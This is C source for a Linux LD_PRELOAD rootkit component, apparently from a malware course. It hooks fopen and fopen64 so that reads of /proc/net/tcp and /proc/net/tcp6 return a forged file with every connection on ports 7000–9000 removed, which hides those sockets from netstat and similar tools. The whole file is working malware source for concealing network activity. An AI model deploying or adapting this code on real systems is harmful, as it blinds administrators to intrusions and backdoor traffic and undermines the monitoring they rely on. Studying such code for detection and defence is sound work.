#define _GNU_SOURCE
//#define DEBUG

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>

#define PROC_NET_TCP "/proc/net/tcp"
#define PROC_NET_TCP6 "/proc/net/tcp6"
#define LIBC_PATH "/lib/libc.so.6" 
//#define LIBC_PATH "/home/adhokshajmishra/course/malware/unitedcon/patched_glibc/lib/libc.so.6"
#define LOW_PORT 7000
#define HIGH_PORT 9000

void *libc;

char libc_path[256];

static void init (void) __attribute__ ((constructor));
static FILE *(*old_fopen) (const char *filename, const char *mode);
static FILE *(*old_fopen64) (const char *filename, const char *mode);

void __attribute ((constructor)) init (void)
{
    libc = dlopen (LIBC_PATH, RTLD_LAZY);
}

FILE *forge_proc_net_tcp (const char *filename)
{
    char line[LINE_MAX];

    unsigned long rxq, txq, time_len, retr, inode;
    int local_port, rem_port, d, state, uid, timer_run, timeout;
    char rem_addr[128], local_addr[128], more[512];

    if (!libc)
        libc = dlopen (LIBC_PATH, RTLD_LAZY);

    if (!old_fopen)
        old_fopen = dlsym (libc, "fopen");

    FILE *tmp = tmpfile ();

    FILE *pnt = old_fopen (filename, "r");

    while (fgets (line, LINE_MAX, pnt) != NULL)
    {
        sscanf (line, "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
                &d, local_addr, &local_port, rem_addr, &rem_port, &state,
                &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
                &inode, more);


        if ((rem_port >= LOW_PORT && rem_port <= HIGH_PORT)) 
        {
        }
        else
        {
            if (local_port >= LOW_PORT && local_port <= HIGH_PORT)
            {
            }
            else
            {
                fputs (line, tmp);
            }

        }
    }

    fclose (pnt);
    fseek (tmp, 0, SEEK_SET);
    return tmp;
}

FILE *
fopen (const char *filename, const char *mode)
{
#ifdef DEBUG
  printf ("fopen hooked %s.\n", filename);
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fopen)
    old_fopen = dlsym (libc, "fopen");
    
  if (strcmp (filename, PROC_NET_TCP) == 0
      || strcmp (filename, PROC_NET_TCP6) == 0)
    return forge_proc_net_tcp (filename);

  return old_fopen (filename, mode);
}

FILE *
fopen64 (const char *filename, const char *mode)
{
#ifdef DEBUG
  printf ("fopen64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fopen64)
    old_fopen64 = dlsym (libc, "fopen64");

  if (strcmp (filename, PROC_NET_TCP) == 0
      || strcmp (filename, PROC_NET_TCP6) == 0)
    return forge_proc_net_tcp (filename);

  return old_fopen64 (filename, mode);
}
